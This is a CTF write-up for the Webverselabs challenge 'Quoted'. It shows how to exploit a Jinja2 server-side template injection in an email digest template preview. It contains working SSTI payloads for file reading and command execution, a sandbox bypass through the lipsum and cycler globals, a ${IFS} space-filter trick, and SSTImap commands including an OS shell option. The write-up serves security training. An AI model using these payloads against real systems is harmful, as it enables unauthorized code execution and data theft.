---
title: "Webverselabs Quoted Challenge SSTI  "
date: 2026-06-13 09:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Hard , Challenge , Web_Attacks ]
---


## Scenario : 


Quoted is a four-person team out of Edinburgh who built the tool they wished existed: a calm, opinionated home for the sentences you underline on your Kindle, save in Pocket, or pull out of an RSS feed. The weekly digest is the main product loop — Sunday morning, a single email with six highlights you'd otherwise forget. Power-users kept asking to rearrange the layout, so Cate (their backend lead) shipped a small templating surface in /settings/digest-template last quarter and went to some lengths to lock it down before launch. She read the Jinja2 sandbox docs, denied the obvious class-walk attributes, and called it done. The QA tasks for that PR were closed in an hour.


## Solution :

<img width="1655" height="804" alt="image" src="https://github.com/user-attachments/assets/9147b841-3de6-459c-9405-71b7996f6478" />

We first create an account to enumerate the application further, as usual we browse it like a normal user then check Burp's history to check the different requests made to the server . 

<img width="1236" height="737" alt="image" src="https://github.com/user-attachments/assets/57cb93d8-1ba4-42c9-b59f-8faabec7fb78" />

We see that we have the possibility to Preview our Custom emails : 

<img width="1528" height="782" alt="image" src="https://github.com/user-attachments/assets/1a080b89-27f9-4b18-9f69-ae95082c7ddf" />

If we check Burp's History : 

<img width="1495" height="693" alt="image" src="https://github.com/user-attachments/assets/db84f774-6aa8-4a0e-898b-1dce818bb04f" />

The Preview botton sends a POST request to the server containing whatever we typed inside the Template Body as a parameter (it just encodes it before sending it). 

To be fair the use of brackets is already a huge hint that a Server side template is being used . 

Templates are used to dynamically render content by injecting variables into HTML pages . BUT when user input is embedded directly into them without sanitization, it leads to SSTI (Server-Side Template Injection), a vulnerability that allows an attacker to inject and run malicious code on the server.

I already have a detailed section on my Web_App methdology for SSTI injections that i will be following : 

```bash
https://elmehdilaassiri.github.io/posts/web-app-pentesting-methodology/#ssti-
```

{% raw %}
```bash
# Detection payload:
${7*7}
{{7*7}}
# Follow this graph to identify the engine:
# https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/
```
{% endraw %}
**Exploitation : Jinja2**
{% raw %}
```python
# 1/ Information Disclosure :
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}

# 2/ LFI :
{{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}

# 3/ RCE :
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Exploitation : Twig**

```php
# 1/ Information Disclosure :
{{ _self }}

# 2/ LFI :
{{ "/etc/passwd"|file_excerpt(1,-1) }}

# 3/ RCE :
{{ ['id'] | filter('system') }}
```
{% endraw %}


**Automation :**

```bash
git clone https://github.com/vladko312/SSTImap
cd SSTImap
pip3 install -r requirements.txt
python3 sstimap.py
python3 sstimap.py -u http://172.17.0.2/index.php?name=test
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd'
python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id
python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell
```

Now first i injected a simple payload 7*7 and based on the response we would know wether or not our code was executed and if we have an SSTI or not , if we get 49 rendered to us this means we got our code executed . 

After that based on the Response we get from the server , we would know which Engine is being used . We will follow this diagram from Payload All the Things . 

<img width="1094" height="475" alt="image" src="https://github.com/user-attachments/assets/abaec2d0-5ba9-44cc-89c9-d6997cfe14bd" />

Now back to our Burp request : 

<img width="1551" height="746" alt="image" src="https://github.com/user-attachments/assets/521b6e64-e271-4158-a264-c9f923ac067f" />

We see that we get a 49 which means the parameter is vulnerable to an SSTI. 

Now we can move to see which engine is being used , to save time i injected the payloads for Jinja2 first , if it won't work then that will confirm it is Twig . 

<img width="1486" height="772" alt="image" src="https://github.com/user-attachments/assets/cc5c1ca8-c457-45ad-b30e-0d7c026e51bc" />

We get detailed information about the engine , which proves Jinja is being used . 

We can use the LFI payload to try and read a specific file. 

The payload didn't work at first , so i tried listing the available classes to see which one we can use for the LFI :

<img width="1139" height="403" alt="image" src="https://github.com/user-attachments/assets/39c84e27-e6a1-4d69-8d28-10734dfb8137" />

But we got a Security Error. Instead of enumerating, we can try to brute-force our way in by testing common Jinja2 built-in globals:


{% raw %}
```bash
{{ config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() }} : This one didn't work . 

{{ lipsum.__globals__["os"].popen("cat /etc/passwd").read() }} : Worked Perfectly . 

{{ cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }} : Worked as well .

```
{% endraw %}

<img width="1244" height="772" alt="image" src="https://github.com/user-attachments/assets/79e1f05c-22a1-4f6b-93b6-093ceb4462a6" />

This confirms that the sandbox restricts attribute access on primitive types like strings, but overlooks Jinja2's built-in globals such as lipsum and cycler, which still expose os through their globals giving us our LFI.

We can also try to read the Flag by using our RCE payload since it worked without any issues. 

<img width="1313" height="444" alt="image" src="https://github.com/user-attachments/assets/8f8d941b-d9aa-4237-81fe-40a6c757dbf1" />

Whenever we get a space issue just replace it with ${IFS} and that should bypass the space filters.

<img width="1343" height="596" alt="image" src="https://github.com/user-attachments/assets/4c08cd72-cd0a-46a4-8020-35d9cc3f6184" />

That was all for this challenge, see you in the next one. 


